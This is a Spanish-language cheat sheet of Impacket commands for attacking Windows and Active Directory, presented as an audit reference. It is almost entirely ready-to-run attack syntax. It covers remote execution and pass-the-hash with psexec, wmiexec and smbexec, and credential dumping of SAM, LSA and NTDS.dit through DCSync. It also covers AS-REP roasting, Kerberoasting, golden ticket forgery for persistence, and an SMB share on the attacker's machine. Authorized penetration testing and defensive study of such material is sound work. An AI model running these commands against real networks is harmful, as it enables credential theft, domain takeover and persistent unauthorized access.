# Impacket Suite Cheat Sheet

Comandos de referencia para herramientas de la suite Impacket en auditoría de Windows y entornos Active Directory.

---

## 1. Ejecución Remota de Comandos (Lateral Movement)

### `impacket-psexec`
Creación de servicio remoto en Windows. Escribe a disco y genera registros en logs (ruidoso), pero otorga privilegios de nivel `SYSTEM`.
```bash
# Autenticación con contraseña:
impacket-psexec dominio.local/usuario:password@<IP>

# Autenticación Pass-the-Hash:
impacket-psexec dominio.local/usuario@<IP> -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH
```

### `impacket-wmiexec`
Ejecución semi-interactiva mediante WMI. Más sigiloso al no instalar servicios en el host objetivo.
```bash
impacket-wmiexec dominio.local/usuario:password@<IP>
impacket-wmiexec dominio.local/usuario@<IP> -hashes :NTLM_HASH
```

### `impacket-smbexec`
Ejecución de comandos a través del procesador de comandos nativo (`cmd.exe`) sin persistencia de servicio.
```bash
impacket-smbexec dominio.local/usuario:password@<IP>
```

---

## 2. Extracción de Credenciales (Credential Dumping)

### `impacket-secretsdump`
Volcado de contraseñas locales (SAM, secretos LSA) o base de datos completa de dominio (`NTDS.dit`).
* Volcado en modo local (procesando archivos recuperados del registro):
  ```bash
  impacket-secretsdump -sam sam.save -system system.save LOCAL
  ```
* Volcado remoto de SAM/LSA (requiere privilegios administrativos locales):
  ```bash
  impacket-secretsdump dominio.local/usuario:password@<IP>
  ```
* Volcado remoto de NTDS.dit (DCSync - requiere permisos de replicación de dominio):
  ```bash
  impacket-secretsdump dominio.local/usuario_admin:password@<IP_DC>
  
  # Alternativa Pass-the-Hash
  impacket-secretsdump dominio.local/usuario_admin@<IP_DC> -hashes :NTLM_HASH
  ```

---

## 3. Ataques Kerberos

### `impacket-GetNPUsers` (AS-REP Roasting)
Búsqueda y solicitud de tickets TGT para cuentas con pre-autenticación desactivada.
```bash
impacket-GetNPUsers dominio.local/ -no-pass -usersfile usuarios.txt -format hashcat -outputfile asreproast.txt
```

### `impacket-GetUserSPNs` (Kerberoasting)
Búsqueda y solicitud de tickets de servicio (TGS) para cuentas vinculadas a un SPN.
```bash
impacket-GetUserSPNs dominio.local/usuario:password -request -outputfile kerberoast.txt
```

### `impacket-getTGT` (Over-Pass-the-Hash / Pass-the-Key)
Solicitud de ticket TGT utilizando el hash NTLM o clave criptográfica AES.
```bash
impacket-getTGT dominio.local/usuario -hashes :NTLM_HASH

# Exportar variable de entorno para habilitar el ticket generado (.ccache):
export KRB5CCNAME=usuario.ccache
```

### `impacket-ticketer` (Golden & Silver Tickets)
Falsificación de tickets Kerberos para persistencia.
```bash
# Generación de Golden Ticket (requiere hash NTLM del usuario krbtgt):
impacket-ticketer -nthash <HASH_KRBTGT> -domain-sid <SID_DOMINIO> -domain dominio.local AdministradorFalso
```

---

## 4. Servidor de Archivos Temporal

### `impacket-smbserver`
Servicio SMB en la máquina atacante para transferencia bidireccional de archivos.
```bash
# Compartir directorio de trabajo actual (soporta SMBv2):
impacket-smbserver compartida $(pwd) -smb2support

# Compartir con credenciales de acceso definidas:
impacket-smbserver compartida $(pwd) -smb2support -user 'hacker' -password 'hacker123'
```
